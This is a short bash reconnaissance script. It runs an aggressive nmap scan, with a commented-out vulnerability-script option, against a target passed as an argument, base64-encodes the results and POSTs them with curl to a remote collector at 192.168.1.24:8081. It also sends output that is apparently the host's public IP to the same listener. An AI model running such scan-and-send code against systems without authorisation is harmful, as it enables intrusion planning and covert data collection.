#!/bin/bash
#nmap --script vuln [ip]
#   -A  all
python3 gips.py > public.txt &&
curl -d @public.txt -X POST http://192.168.1.24:8081?date=public_$(date '+%H-%M-%d-%m-%Y');
nmap -A $1 | tee nscan.txt &&
base64 nscan.txt > nscane.txt &&
curl -d @nscane.txt -X POST http://192.168.1.24:8081?date=$(date '+%H-%M-%d-%m-%Y');
